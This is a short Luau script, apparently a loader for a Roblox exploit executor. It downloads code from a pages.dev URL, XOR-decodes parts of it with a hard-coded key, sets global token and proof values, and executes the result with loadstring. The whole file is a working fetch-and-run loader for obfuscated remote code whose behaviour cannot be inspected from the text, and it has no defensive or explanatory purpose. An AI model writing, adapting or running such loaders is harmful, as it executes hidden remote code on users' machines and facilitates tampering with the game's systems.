local U = "https://ac-nametag-cfg-7k3m.pages.dev/api/script?ot=828a6dbc4b2718843b89a62326cea5880f2fb881c072bccb"
local P = {125,64,32,5,219,93,49,114,229,1,182,185,86,108,103,185,218,181,220,109,183,56,40,143,74,6,33,51,26,205,108,249}
local K = ""
local src = game:HttpGet(U)
do
	local g = (type(getgenv) == "function" and getgenv()) or getfenv() or _G
	g.VX_TOKEN = "9e6a24d7ddf2f75416f1c799d4eb8474"
	g.VX_RELEASE = "ad267b4316f1e453d335e2068688c34e"
	g.VX_NONCE = "32e4e3e170c625b3d0a21b302b7861cb"
	g.VX_PROOF = "9306bba4d60d7e5e378c2bbc41fa06ca8090e9ad6e0d440ec0f0a6e81b227dd3"
end
local function wx(s, a, n)
	if a < 1 then a = 1 end
	if a + n - 1 > #s then n = #s - a + 1 end
	if n < 1 then return s end
	local b = table.pack(string.byte(s, a, a + n - 1))
	for i = 1, n do b[i] = bit32.bxor(b[i], P[(i - 1) % #P + 1]) end
	return s:sub(1, a - 1) .. string.char(unpack(b, 1, n)) .. s:sub(a + n)
end
do
	local n = #src
	src = wx(src, 1, 96)
	local off = 65536
	if n > 131840 then
		off = 65536 + (P[1] + P[2] * 256 + P[3] * 65536 + P[4] * 16777216) % (n - 131584)
	elseif n > 448 then
		off = 224
	else
		off = 1
	end
	src = wx(src, off, 224)
	src = wx(src, n - 95, 96)
end
if type(getgenv) == "function" and K ~= "" then getgenv().AC_ACKEY = K end
local fn, err = loadstring(src)
if not fn then error("loader failed: " .. tostring(err)) end
return fn()